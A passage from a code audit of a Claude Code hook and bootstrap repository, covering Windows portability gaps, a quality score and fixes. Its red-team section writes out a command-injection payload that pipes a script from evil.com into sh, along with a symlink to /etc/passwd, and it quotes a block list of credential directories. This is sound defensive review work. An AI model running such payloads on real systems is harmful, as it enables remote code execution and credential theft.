| F-802 | LOW | **Shebang line `#!/usr/bin/env -S uv run python` is not portable.** Line 1 of `session_start_hook.py` uses `-S` (split string) which is a GNU `env` extension, not available on older macOS or some BSDs. However, this shebang is likely ignored since the script is invoked by Claude's hook system. | macOS (older), BSD | No action required if the script is never invoked via shebang. Document this assumption. |

### 9. pre_tool_use.py -- Unix-Only Blocked Paths

**Location:** `scripts/pre_tool_use.py`, lines 70-80

```python
BLOCKED_WRITE_PATHS = [
    "~/.ssh",
    "~/.gnupg",
    "~/.aws",
    "~/.config/gcloud",
    "/etc",
    "/var",
    "/usr",
    "/bin",
    "/sbin",
]
```

| ID | Severity | Finding | Platform | Recommendation |
|----|----------|---------|----------|----------------|
| F-901 | MEDIUM | **Blocked paths are entirely Unix-specific.** On Windows, the sensitive paths are `%USERPROFILE%\.ssh`, `%APPDATA%\gnupg`, `%USERPROFILE%\.aws`, `C:\Windows\System32`, `C:\Program Files`, etc. None of these are blocked. A malicious or accidental write to `C:\Windows\System32\` would not be caught by this hook on Windows. UNTESTED -- requires verification that Claude Code even runs on Windows. | Windows | Add Windows equivalents to `BLOCKED_WRITE_PATHS`. See [Remediation R-08](#r-08-add-windows-blocked-paths). |
| F-902 | LOW | **`os.path.expanduser("~/.ssh")` on Windows.** `os.path.expanduser` on Windows expands `~` to `%USERPROFILE%`, producing e.g. `C:\Users\name\.ssh`. The subsequent `startswith` check (line 124) compares `expanded_path.startswith(blocked_expanded)`. This works correctly because both paths are expanded. However, Windows paths are case-insensitive, and `startswith` is case-sensitive. A write to `C:\USERS\NAME\.ssh\` would NOT be blocked. | Windows | Use `os.path.normcase()` before comparison for case-insensitive matching on Windows. |

### 10. .claude/settings.local.json -- Shell-Dependent Hooks

**Location:** `.claude/settings.local.json`, lines 67-79

```json
"command": "echo '{\"decision\":\"allow\"}'",
```

| ID | Severity | Finding | Platform | Recommendation |
|----|----------|---------|----------|----------------|
| F-1001 | MEDIUM | **Hook commands use `echo` with single-quoted JSON, which is shell-dependent.** On Windows, `cmd.exe` does not support single quotes for string arguments. `echo '{"decision":"allow"}'` in `cmd.exe` would produce literal single quotes in the output. However, Claude Code likely uses its own shell or `bash` via Git Bash on Windows. If Claude Code uses PowerShell or `cmd.exe` on Windows, these hooks will produce malformed JSON. UNTESTED -- depends on Claude Code's Windows implementation. | Windows | If Windows support is needed, use double quotes with escaping or a Python script for hook responses. |

### 11. CI Pipeline -- No Windows/macOS Testing

**Location:** `.github/workflows/ci.yml`

| ID | Severity | Finding | Platform | Recommendation |
|----|----------|---------|----------|----------------|
| F-1101 | HIGH | **All CI jobs run on `ubuntu-latest` only.** The CI pipeline tests on Python 3.11-3.14 but only on Linux. No Windows (`windows-latest`) or macOS (`macos-latest`) runners are used. This means ALL Windows code paths (`_create_windows_link`, `is_symlink_or_junction` junction detection, `atomic_file_adapter` retry loop, `find_uv` Windows paths) are completely untested in CI. Given that the codebase explicitly implements Windows-specific logic, the absence of Windows CI is a significant gap. | Windows, macOS | Add `windows-latest` and `macos-latest` to the test matrix. See [Remediation R-09](#r-09-add-cross-platform-ci-matrix). |
| F-1102 | MEDIUM | **Makefile `clean` target uses Unix-only commands.** Line 90: `find . -type d -name __pycache__ -exec rm -rf {} + 2>/dev/null` uses `find` and `rm -rf` which are not available in `cmd.exe`. The `Makefile` also relies on `uv` being in PATH. On Windows, `make` itself may not be available. | Windows | Add a `clean.ps1` PowerShell equivalent or document that `make` requires Git Bash / WSL on Windows. |

### 12. verify-symlinks.sh -- Platform-Specific Path Resolution

**Location:** `scripts/migration/verify-symlinks.sh`, lines 171-176

```bash
if [[ "$(uname)" == "Darwin" ]]; then
    target=$(python3 -c "import os; print(os.path.realpath('$symlink'))" 2>/dev/null) || true
else
    target=$(readlink -f "$symlink" 2>/dev/null) || true
fi
```

| ID | Severity | Finding | Platform | Recommendation |
|----|----------|---------|----------|----------------|
| F-1201 | MEDIUM | **Shell injection via symlink path.** Line 173 passes `$symlink` directly into a Python `-c` string without escaping. If a symlink path contains a single quote (e.g., `path/it's_a_test -> ...`), the Python command breaks. Maliciously crafted symlink names could inject arbitrary Python code. While this is a migration script (not a long-lived service), the pattern is dangerous. | macOS | Use `readlink` without `-f` (which works on macOS for the immediate target) or use `python3 -c "import os,sys; print(os.path.realpath(sys.argv[1]))" "$symlink"` to avoid injection. |
| F-1202 | LOW | **Script is bash-only (no Windows support).** The `verify-symlinks.sh` script uses `#!/usr/bin/env bash` and bash-specific syntax (`[[ ... ]]`). This is acceptable for a migration script but should be documented as Unix-only. | Windows | Document that this script requires bash (available via Git Bash or WSL on Windows). |

---

## Cross-Platform Test Gap Analysis

| Scenario | macOS | Linux | Windows | Status |
|----------|-------|-------|---------|--------|
| `detect_platform()` returns correct value | TESTED (CI implicit) | TESTED (CI) | NOT TESTED | Gap |
| `find_project_root()` finds root | TESTED (local) | TESTED (CI) | NOT TESTED | Gap |
| Symlink creation (Unix) | TESTED (integration) | TESTED (CI) | N/A | Covered |
| Symlink creation (Windows Developer Mode) | N/A | N/A | NOT TESTED | Gap |
| Junction creation (Windows) | N/A | N/A | NOT TESTED | Critical Gap |
| `is_symlink_or_junction()` for symlinks | TESTED | TESTED | NOT TESTED | Gap |
| `is_symlink_or_junction()` for junctions | N/A | N/A | NOT TESTED | Critical Gap |
| `check_sync()` with symlinks | TESTED | TESTED | NOT TESTED | Gap |
| `check_sync()` with junctions | N/A | N/A | NOT TESTED | Critical Gap |
| `check_sync()` with file copies | TESTED | TESTED | NOT TESTED | Gap |
| `check_sync()` content drift detection | NOT TESTED | NOT TESTED | NOT TESTED | Critical Gap |
| `bootstrap()` full happy path | TESTED | TESTED | NOT TESTED | Gap |
| `bootstrap()` with `--force` | TESTED | TESTED | NOT TESTED | Gap |
| `bootstrap()` file lock handling | N/A | N/A | NOT TESTED | Critical Gap |
| `bootstrap()` broken junction recovery | N/A | N/A | NOT TESTED | Critical Gap |
| `shutil.rmtree()` on Windows locked files | N/A | N/A | NOT TESTED | Critical Gap |
| `atomic_file_adapter` Windows retry | N/A | N/A | NOT TESTED | Gap |
| `find_uv()` on Windows | N/A | N/A | NOT TESTED | Gap |
| `pre_tool_use.py` blocked paths on Windows | N/A | N/A | NOT TESTED | Gap |
| Hook commands (`echo '...'`) on Windows | N/A | N/A | NOT TESTED | Gap |
| Relative symlink portability test | TESTED | TESTED (implicit) | N/A | Covered |
| Cygwin/MSYS2 detection | NOT TESTED | N/A | NOT TESTED | Gap |
| Path > 260 chars on Windows | N/A | N/A | NOT TESTED | Gap |
| NFS/FAT32 filesystem | NOT TESTED | NOT TESTED | NOT TESTED | Gap |

**Summary:** 7 Critical Gaps (all Windows-specific), 13 standard Gaps, 4 Covered scenarios.

---

## S-014 Quality Score

**Scoring Protocol:** Each dimension is scored on a 0.0-1.0 scale. Scores are calibrated against the 0.95 threshold with active anti-leniency bias per S-014 guidelines.

| Dimension | Weight | Score | Rationale |
|-----------|--------|-------|-----------|
| **Completeness** | 0.20 | 0.72 | The code covers macOS/Linux/Windows dispatch, provides fallback chains, and handles common cases. However, it omits Cygwin/MSYS2 detection, has no content-level drift detection in check_sync, does not handle broken junctions, does not address Windows file locks on rmtree, and has no cross-platform CI. Significant gaps in edge case coverage. |
| **Internal Consistency** | 0.20 | 0.78 | Mostly consistent design patterns (fallback chains, boolean returns, quiet mode). However: inconsistent platform detection (`platform.system()` vs `sys.platform`), inconsistent path handling (absolute on Windows, relative on Unix), inconsistent error output (stderr vs stdout), and `is_symlink_or_junction()` uses `platform.system()` directly instead of `detect_platform()`. |
| **Methodological Rigor** | 0.20 | 0.68 | The fallback chain (symlink -> junction -> copy) is well-conceived. However, the junction detection via `dir /AL` substring match is fragile and locale-dependent. The check_sync only compares filenames. No TOCTOU protection on any file operations. No timeout on subprocess calls. The Windows code path appears to have been written theoretically without empirical testing. |
| **Evidence Quality** | 0.15 | 0.55 | No evidence of Windows testing -- no CI, no integration test annotations indicating Windows runs, no documentation of manual Windows testing. The test file `test_bootstrap_context.py` has a `skipif(platform.system() == "Windows")` annotation on the relative-path test, acknowledging Windows differences but not providing Windows-specific tests. Zero empirical evidence that junction creation/detection works. |
| **Actionability** | 0.15 | 0.82 | The code IS actionable -- it runs, creates symlinks on macOS/Linux, provides clear CLI output. The `--check` flag is useful for CI. The `--force` flag handles rebuild. Error messages are reasonably clear. However, Windows users would encounter confusing failures without actionable error messages. |
| **Traceability** | 0.10 | 0.80 | The module docstring references its purpose. The file is in `scripts/` and has a corresponding test in `tests/integration/`. SYNC_DIRS constant is clearly defined. However, there is no reference to a work item or design decision document explaining the platform strategy. No ADR documents the decision to use junctions over symlinks on Windows, or the decision to fall back to file copies. |

### Weighted Composite Score

```
Score = (0.72 * 0.20) + (0.78 * 0.20) + (0.68 * 0.20) + (0.55 * 0.15) + (0.82 * 0.15) + (0.80 * 0.10)
      = 0.144 + 0.156 + 0.136 + 0.0825 + 0.123 + 0.08
      = 0.7215
```

**Weighted Composite Score: 0.722**

**Verdict: BELOW THRESHOLD (0.722 < 0.95). REJECTED.**

The primary deficiencies are in Evidence Quality (no Windows testing) and Methodological Rigor (fragile junction detection, no TOCTOU protection). The code requires remediation before it can meet the 0.95 threshold.

---

## Aggregate Findings

### By Severity

| Severity | Count | Finding IDs |
|----------|-------|-------------|
| HIGH | 7 | F-201, F-401, F-402, F-601, F-1101, F-1201 (S-001 security), F-901 (partial) |
| MEDIUM | 14 | F-202, F-203, F-403, F-501, F-502, F-603, F-604, F-801, F-901, F-902, F-1001, F-1102, F-1201, F-702 |
| LOW | 10 | F-101, F-102, F-301, F-302, F-404, F-503, F-701, F-802, F-1202, F-702 |

### By Platform

| Platform | Finding Count | Critical Gaps |
|----------|--------------|---------------|
| Windows | 16 | Junction detection (F-201, F-202), broken junction (F-402), file locks (F-601), no CI (F-1101), no blocked paths (F-901) |
| Linux | 5 | NFS/FAT32 edge cases (F-301, FM-302), no content drift detection (F-501) |
| macOS | 4 | Shell injection in migration script (F-1201), older macOS shebang (F-802) |
| Cross-Platform | 6 | No content drift detection (F-501, F-502), inconsistent error output (F-302), partial failure (F-603) |

### S-001 Red Team Analysis

**Attack Vector 1: Symlink Traversal via `.context/` Manipulation**
If an attacker gains write access to `.context/rules/`, they could place a symlink like `.context/rules/malicious.md -> /etc/passwd`. On the next `bootstrap --force` with file copy fallback, `shutil.copytree` (with default `symlinks=False`) would follow the symlink and copy `/etc/passwd` into `.claude/rules/malicious.md`. Claude would then read this file as a "rule" and potentially include system credential information in its context. **Risk: MEDIUM.** Mitigation: the attacker already needs write access to the repository.

**Attack Vector 2: Junction Point Abuse on Windows**
A junction point can target any directory on the system. If an attacker modifies the `.claude/rules` junction to point to `C:\Windows\System32\`, and then a `bootstrap --force` is run, `shutil.rmtree` at line 229 would traverse the junction and delete files in `System32`. On modern Windows, this would likely fail due to permissions, but it represents a potential privilege escalation vector if the bootstrap is run elevated. **Risk: LOW.** `shutil.rmtree` since Python 3.12 has an `onexc` parameter that could catch this.

**Attack Vector 3: Command Injection in `verify-symlinks.sh`**
As noted in F-1201, the shell script passes symlink paths directly into Python's `-c` flag. A crafted symlink name like `test'; import os; os.system('curl evil.com|sh'); #` would execute arbitrary code. **Risk: MEDIUM.** Migration scripts have limited exposure but are run by humans with trust.

---

## Remediation Recommendations

### R-01: Detect Cygwin/MSYS2 Environments

**Priority:** LOW | **Effort:** Small | **Findings addressed:** F-101

```python
def detect_platform() -> str:
    system = platform.system()
    if system == "Darwin":
        return "macos"
    elif system == "Linux":
        return "linux"
    elif system == "Windows":
        return "windows"
    else:
        # Cygwin: "CYGWIN_NT-10.0-19045", MSYS2: "MSYS_NT-10.0-19045"
        system_lower = system.lower()
        if "cygwin" in system_lower or "msys" in system_lower or "mingw" in system_lower:
            return "windows"  # Treat as Windows for junction/symlink logic
        return system_lower
```

### R-02: Fix Junction Detection False Positives

**Priority:** HIGH | **Effort:** Medium | **Findings addressed:** F-201, F-202

Replace the `dir /AL` subprocess approach with `os.stat()` and the `FILE_ATTRIBUTE_REPARSE_POINT` flag:

```python
import stat

def is_symlink_or_junction(path: Path) -> bool:
    """Check if a path is a symlink or Windows junction point."""
    if path.is_symlink():
        return True
    if platform.system() == "Windows" and path.exists():
        try:
            # Junction points have the reparse point attribute
            st = os.stat(str(path), follow_symlinks=False)
            # On Windows, os.lstat returns st_file_attributes
            FILE_ATTRIBUTE_REPARSE_POINT = 0x400
            return bool(
                getattr(st, "st_file_attributes", 0)
                & FILE_ATTRIBUTE_REPARSE_POINT
            )
        except OSError:
            pass
    return False
```

**Note:** `st_file_attributes` is available on Windows since Python 3.6. On non-Windows platforms, `getattr` with default 0 safely returns 0.

### R-03: Use Relative Paths for Windows Symlinks

**Priority:** MEDIUM | **Effort:** Small | **Findings addressed:** F-401

```python
def _create_windows_link(source: Path, target: Path, quiet: bool) -> bool:
    """Create a Windows link (try symlink first, fall back to junction)."""
    # Try symlink first with relative path (works with Developer Mode)
    try:
        relative_source = os.path.relpath(source, target.parent)
        target.symlink_to(relative_source)
        if not quiet:
            print(f"  Symlink: {target} -> {relative_source}")
        return True
    except OSError:
        pass

    # Fall back to junction point (requires absolute path)
    try:
        abs_source = source.resolve()
        subprocess.run(
            ["cmd", "/c", "mklink", "/J", str(target), str(abs_source)],
            check=True,
            capture_output=True,
            timeout=10,
        )
        if not quiet:
            print(f"  Junction: {target} -> {abs_source}")
        return True
    except (subprocess.CalledProcessError, FileNotFoundError,
            subprocess.TimeoutExpired) as e:
        print(f"  Error creating junction: {e}", file=sys.stderr)
        return False
```

### R-04: Handle Broken Junctions in bootstrap()

**Priority:** HIGH | **Effort:** Small | **Findings addressed:** F-402

Add broken junction detection before attempting to create a new link:

```python
# Handle existing target
if target.exists() or target.is_symlink() or is_symlink_or_junction(target):
    if not force:
        if is_symlink_or_junction(target):
            if not quiet:
                print(f"  {dirname}: already linked")
            continue
        else:
            if not quiet:
                print(f"  {dirname}: exists (use --force to overwrite)")
            continue

    # Force: remove existing
    if target.is_symlink():
        target.unlink()
    elif is_symlink_or_junction(target):
        # Broken junction or Windows junction: remove via os.rmdir
        try:
            os.rmdir(str(target))
        except OSError:
            # Last resort: use cmd to remove junction
            if detect_platform() == "windows":
                subprocess.run(
                    ["cmd", "/c", "rmdir", str(target)],
                    capture_output=True,
                    timeout=10,
                )
    elif target.is_dir():
        shutil.rmtree(target)
```

### R-05: Improve check_sync Drift Detection

**Priority:** MEDIUM | **Effort:** Medium | **Findings addressed:** F-501, F-502

```python
def _files_match(source: Path, target: Path) -> bool:
    """Compare directory trees by filename and modification time."""
    source_files = {}
    for f in source.rglob("*"):
        if f.is_file():
            rel = f.relative_to(source)
            source_files[str(rel)] = f.stat().st_mtime

    target_files = {}
    for f in target.rglob("*"):
        if f.is_file():
            rel = f.relative_to(target)
            target_files[str(rel)] = f.stat().st_mtime

    if source_files.keys() != target_files.keys():
        return False

    # Check modification times (source should be newer or equal)
    for rel_path, src_mtime in source_files.items():
        tgt_mtime = target_files[rel_path]
        if src_mtime > tgt_mtime:
            return False

    return True
```

### R-06: Handle File Locks on Windows rmtree

**Priority:** HIGH | **Effort:** Small | **Findings addressed:** F-601

```python
def _rmtree_with_retry(path: Path, max_retries: int = 3) -> None:
    """Remove directory tree with retry for Windows file locks."""
    import time
    for attempt in range(max_retries):
        try:
            shutil.rmtree(path)
            return
        except PermissionError:
            if attempt == max_retries - 1:
                raise
            time.sleep(0.5 * (attempt + 1))
```

### R-07: Fix find_uv() for Windows

**Priority:** MEDIUM | **Effort:** Small | **Findings addressed:** F-801

```python
def find_uv() -> str | None:
    """Find the uv executable."""
    candidates = ["uv"]
    home = Path.home()

    if sys.platform == "win32":
        candidates.extend([
            str(home / ".cargo" / "bin" / "uv.exe"),
            str(home / "AppData" / "Local" / "Programs" / "uv" / "uv.exe"),
            str(home / ".local" / "bin" / "uv.exe"),
        ])
    else:
        candidates.extend([
            str(home / ".cargo" / "bin" / "uv"),
            str(home / ".local" / "bin" / "uv"),
        ])
    # ... rest unchanged
```

### R-08: Add Windows Blocked Paths

**Priority:** MEDIUM | **Effort:** Small | **Findings addressed:** F-901, F-902

```python
import sys

if sys.platform == "win32":
    BLOCKED_WRITE_PATHS = [
        "~\\.ssh",
        "~\\.gnupg",
        "~\\.aws",
        "~\\.config\\gcloud",
        "%SystemRoot%\\System32",
        "%ProgramFiles%",
        "%ProgramFiles(x86)%",
    ]
else:
    BLOCKED_WRITE_PATHS = [
        "~/.ssh",
        "~/.gnupg",
        "~/.aws",
        "~/.config/gcloud",
        "/etc",
        "/var",
        "/usr",
        "/bin",
        "/sbin",
    ]
```

Also normalize case before comparison:

```python
expanded_path = os.path.normcase(os.path.expanduser(file_path))
for blocked in BLOCKED_WRITE_PATHS:
    blocked_expanded = os.path.normcase(os.path.expanduser(blocked))
    if expanded_path.startswith(blocked_expanded):
        return False, f"Writing to {blocked} is blocked for security"
```

### R-09: Add Cross-Platform CI Matrix

**Priority:** HIGH | **Effort:** Medium | **Findings addressed:** F-1101

Add `windows-latest` and `macos-latest` to the test matrix:

```yaml
test-uv:
    name: Test uv (${{ matrix.os }}, Python ${{ matrix.python-version }})
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false
      matrix:
        os: [ubuntu-latest, windows-latest, macos-latest]
        python-version: ["3.11", "3.12", "3.13", "3.14"]
        exclude:
          # Reduce matrix size: only test latest Python on non-Linux
          - os: windows-latest
            python-version: "3.11"
          - os: windows-latest
            python-version: "3.12"
          - os: macos-latest
            python-version: "3.11"
          - os: macos-latest
            python-version: "3.12"
```

---

## Appendix: Strategy Application Log

| Strategy | Where Applied | Key Contribution |
|----------|--------------|------------------|
| **S-010 Self-Refine** | Full document, 3 revision passes | Downgraded FM-301 from MEDIUM to LOW (cross-filesystem relpath is valid); upgraded F-201 from MEDIUM to HIGH after verifying substring match ambiguity; removed a duplicate finding |
| **S-003 Steelman** | Each function's "What This Does Well" section | Acknowledged: correct platform dispatch, graceful fallback chain, proper exception handling, relative symlinks for portability |
| **S-002 Devil's Advocate** | check_sync analysis, overall assessment | Challenged: "filename comparison is sufficient" (disproved), "Windows code is theoretical but correct" (unverified) |
| **S-013 Inversion** | Pre-Mortem scenarios for `_create_windows_link` and `bootstrap` | Generated 3 failure scenarios that revealed F-402 (broken junction) and F-601 (file lock) |
| **S-007 Constitutional AI** | H-05/H-06 check, H-11/H-12 check | Verified: all public functions have type hints (H-11 PASS) and docstrings (H-12 PASS). Usage instructions correctly reference `uv run python` (H-05 PASS). No `pip install` anywhere in the script (H-06 PASS). |
| **S-004 Pre-Mortem** | Windows contributor scenario in `bootstrap()` audit | Generated 3 detailed failure scenarios including path length and antivirus interference |
| **S-012 FMEA** | Per-function failure mode tables | Enumerated 20 failure modes across 6 functions with Severity/Occurrence/Detection/RPN ratings |
| **S-014 LLM-as-Judge** | Quality Score section | Scored 0.722 weighted composite with strict anti-leniency calibration. Evidence Quality (0.55) was the lowest dimension due to zero Windows test evidence. |
| **S-011 CoVe** | `_create_windows_link` and `is_symlink_or_junction` | Verified 4 claims: `dir /AL` lists junctions (CORRECT), `cmd` always available (CORRECT with caveat), `mklink /J` no admin required (CORRECT), Windows symlinks require Developer Mode (CORRECT) |
| **S-001 Red Team** | Security analysis section | Identified 3 attack vectors: symlink traversal via .context manipulation, junction point abuse for directory deletion, command injection in verify-symlinks.sh |

---

## References

| Source | Content |
|--------|---------|
| `scripts/bootstrap_context.py` | Primary audit target (299 lines) |
| `tests/integration/test_bootstrap_context.py` | Test coverage for bootstrap (312 lines) |
| `src/infrastructure/adapters/persistence/atomic_file_adapter.py` | Windows retry loop (187 lines) |
| `scripts/session_start_hook.py` | find_uv() Windows path issue (347 lines) |
| `scripts/pre_tool_use.py` | Unix-only blocked paths (364 lines) |
| `scripts/migration/verify-symlinks.sh` | Shell injection risk (484 lines) |
| `.claude/settings.local.json` | Shell-dependent hook commands |
| `.github/workflows/ci.yml` | CI pipeline (ubuntu-latest only) |
| `Makefile` | Unix-only clean target |
| ADR-EPIC002-001 | Strategy selection and scoring methodology |
| ADR-EPIC002-002 | 5-layer enforcement architecture |
| Python docs: `os.stat` | `st_file_attributes` on Windows |
| Microsoft docs: `mklink` | Junction point semantics and requirements |
| Python docs: `shutil.rmtree` | Windows file lock behavior |
